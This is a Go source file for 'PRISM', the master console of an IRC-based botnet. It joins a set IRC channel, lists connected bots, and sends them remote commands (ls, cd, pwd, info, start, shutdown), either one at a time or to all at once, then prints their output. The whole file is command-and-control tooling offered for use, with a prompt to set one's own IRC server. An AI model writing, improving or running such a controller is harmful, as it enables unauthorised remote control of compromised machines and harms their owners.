package main

/* ###############
#### IMPORTS ####
#################*/

import (
	"bufio"
	"fmt"
	irc "github.com/gianarb/go-irc"
	parser "gopkg.in/sorcix/irc.v2"
	"io"
	"log"
	"net/textproto"
	"os"
	"os/exec"
		//"strconv"
	"strings"
	"time"
)

/* #######################################
##### CHANGE THIS TO YOUR IRC SERVER ####
########################################*/
var serverGlobal string = "##merlinsmagic"
var botnameGlobal string = "NotTheMaster"

//Globals
var targetGlobal string = "None Selected"
var connectedGlobal bool = false
var botlistGlobal string = ""
var PROMPT string = "\033[1;91m" + " PRISM " + "\033[0m" + "> "


func clearScreen() {
    cmd := exec.Command("cmd", "/c", "cls")
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func clearLine() {
    fmt.Printf("\033[2K");
}

func red() {
  fmt.Printf("\033[1;91m");
}

func green() {
  fmt.Printf("\033[0;92m");
}

func yellow() {
	fmt.Printf("\033[0;93m");
  }

func reset() {
  fmt.Printf("\033[0m");
}

func banner() {
	banner := `               _
               __ -
           /     __   \
             /   _ -    |
         | '  | (_)  |                        _L/L
            |  __  /   /                    _LT/l_L_
           \ \  __  /                     _LLl/L_T_lL_
               -      _T/L              _LT|L/_|__L_|_L_
                    _Ll/l_L_          _TL|_T/_L_|__T__|_l_
                  _TLl/T_l|_L_      _LL|_Tl/_|__l___L__L_|L_
                _LT_L/L_|_L_l_L_  _'|_|_|T/_L_l__T _ l__|__|L_
	      _Tl_L|/_|__|_|__T _LlT_|_Ll/_l_ _|__[ ]__|__|_l_L_`
	banner2 := `   _`
	banner3 := `PRISM`
    banner4 := `__ _LT_l_l/|__|__l_T _T_L|_|_|l/___|_ _|__l__|__|__|_T_l_  ___ _
           . ";;:;.;;:;.;;;;_Ll_|__|_l_/__|___l__|__|___l__L_|_l_LL_
             .  .:::.:::..:::.";;;;:;;:.;.;;;;,;;:,;;;.;:,;;,;::;:".'
                 . ,::.:::.:..:.: ::.::::;..:,:::,::::.::::.:;:.:..
                    . .:.:::.:::.:::: .::.::. :::.::::..::..:.::. . .
                      . ::.:.: :. .:::  ::::.::.:::.::...:. .:::. .
                          .:. ..   . ::.. .: ::. ::::.:: ::::::.   .
                          .  :.         .. :::.::: ::.::::. ::. .
                            . .           .:. :.. :::. ::..: :.
                nn_r   nn_r   .              :  .:::.:: ::..:  .
               /l(\   /l)\      nn_r          . ::. :. : : ..
               ''"''  ''"''    /\(\              . . .:. . : .
                               ' "''                  . :. ..`
	var botnum int
	var botcount string
	count := strings.Fields(botlistGlobal)
	if botlistGlobal == "" {
		botnum = 0
	} else {
		botnum = len(count)
	}
	if botnum == 1 {
		botcount = "bot  <"
	} else {
		botcount = "bots <"
	}
	clearScreen()
	fmt.Println(banner)
	fmt.Printf(banner2)
	red()
	fmt.Printf(banner3)
	reset()
	fmt.Println(banner4)
	fmt.Printf("\t       -----------------------------\t\t.   .")
	fmt.Printf("\n\t       >  Currently serving %d %s \t\t  .\n", botnum, botcount)
	fmt.Printf("\t       -----------------------------\t\t    .\n")
	fmt.Printf(" List of current bots: " + "\033[1;31m") 
	fmt.Printf("%v \n", botlistGlobal)
	reset()
	fmt.Printf(" Current target      : ")
	green()
	fmt.Println(targetGlobal)
	fmt.Println("")
	reset()
}

/* ###############################
###### Golang Copy Function ######
##################################*/
func Copy(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

/* ##############################
#### Split string into slice ####
#################################*/
func SplitLines(s string) []string {
	var lines []string
	sc := bufio.NewScanner(strings.NewReader(s))
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	return lines
}


func main() {
	clearScreen()
	/* #################
	#### Irc Loop  ####
	####################*/
	go func() {
			// Gen botname
			botname := botnameGlobal
			// Create bot
			bot := irc.NewBot(
				"",
				"irc.freenode.net:6667",
				botname,
				botname,
				serverGlobal,
				"",
			)
			/* ##################
			### Main bot loop ###
			#####################*/
			conn, _ := bot.Connect()
			
			go func() {
				reader := bufio.NewReader(os.Stdin)
				for {
					if connectedGlobal == true {
						fmt.Print(PROMPT)
						code, _ := reader.ReadString('\n')
						result := strings.Trim(code, " \n \r")
						if result == "list" {
							banner()
							bot.Send(fmt.Sprint("NAMES " + serverGlobal))
						} else if result == "quit" {
							conn.Close()
						} else if result == "exit" {
							conn.Close()
						} else if result == "?" || result == "help" {
							banner()
							yellow()
							fmt.Println("[?] Use the 'target' command to select recipient")
							reset()
							fmt.Println("    Single bot selection: target 'botname'")
							fmt.Println("    MASS bot selection : target 'all'")
							red()
							fmt.Println("[~] Current targeted commands")
							reset()
							fmt.Println("    [ls, cd, pwd, info, start, shutdown]")
							red()
							fmt.Println("[~] Current mass commands")
							reset()
							fmt.Println("    [start, shutdown]", "\n")
							green()
							fmt.Println("[~] Current master commands")
							reset()
							fmt.Println("    [quit, help, ?, clear]", "\n")
						} else if result == "clear" {
							banner()
						} else if result == "target" {
							targetGlobal = "None Selected"
						} else if strings.HasPrefix(result, "target"){
							newTarget := strings.TrimPrefix(result, "target")
							nospace := strings.Trim(newTarget, " \n \r")
							if strings.Contains(botlistGlobal, nospace){
								targetGlobal = nospace
								banner()
							} else if nospace == "all" || nospace == "ALL" {
								targetGlobal = nospace
								banner()
							} else {
								red()
								fmt.Printf(" [!!!]")
								reset()
								fmt.Printf(" Target name invald! Enter ")
								green()
								fmt.Printf("'list'")
								reset()
								fmt.Printf(" for bot status\n")
								targetGlobal = "None Selected"
							}
						} else {
							//fmt.Println(result)
							if result != "" && targetGlobal != "None Selected"{
								bot.Send(fmt.Sprint("PRIVMSG " + serverGlobal + " :" + targetGlobal + " " + result))
							}
						}
					}
				}
			}()
			defer conn.Close()
			verbose := false
			reader := bufio.NewReader(conn)
			tp := textproto.NewReader(reader)
			for {
				// Replace ##merlinsmagic for own channel
				//banner := "PRIVMSG " + MASTER_NAME + " :"
				// Begin
				line, err := tp.ReadLine()
				if err != nil {
					log.Fatal("unable to connect to IRC server ", err)
				}
				message := parser.ParseMessage(line)
				messageStr := fmt.Sprintf("%v \n", message)
				// Debugging
				if verbose {
					fmt.Printf("%v \n", message)
				}
				if strings.Contains(messageStr,"ChanServ") {
					trimStr := serverGlobal + " :"
					removeGunk := strings.SplitAfter(messageStr, trimStr)
					listNames := strings.TrimSpace(removeGunk[1])
					removeChan := strings.Trim(listNames,"@ChanServ")
					botlistGlobal = removeChan
					if connectedGlobal != true {
						banner()
						connectedGlobal = true
					}
				}
				
				// Keep alive
				if message.Command == "PING" {
					bot.Send(fmt.Sprint("PONG %d", time.Now().UnixNano()))
				}
				// Debugging
				if message.Command == "JOIN" {
					//fmt.Println("Successful join!")
					bot.Send(fmt.Sprint("NAMES " + serverGlobal))
				}
				// Command handler
				if message.Command == "PRIVMSG" {
					if connectedGlobal != true {
						//do nothing
					} else {
						if message.Params[0] == serverGlobal {
							var output string
							toTrim := "PRIVMSG " + serverGlobal + " :"
							removeLead := strings.Split(messageStr, toTrim)
							output = strings.TrimSpace(removeLead[1])
							
							if strings.HasPrefix(output, "///>") == true {
								red()
								fmt.Printf("OUTPUT\n")
								reset()
							}
							
							fmt.Println(output)
							if strings.HasPrefix(output, "<///") == true {
								fmt.Printf("\n")
								fmt.Printf(PROMPT)
							}
							
						}
					}
				}
			}
		}()
		<-make(chan bool)
}
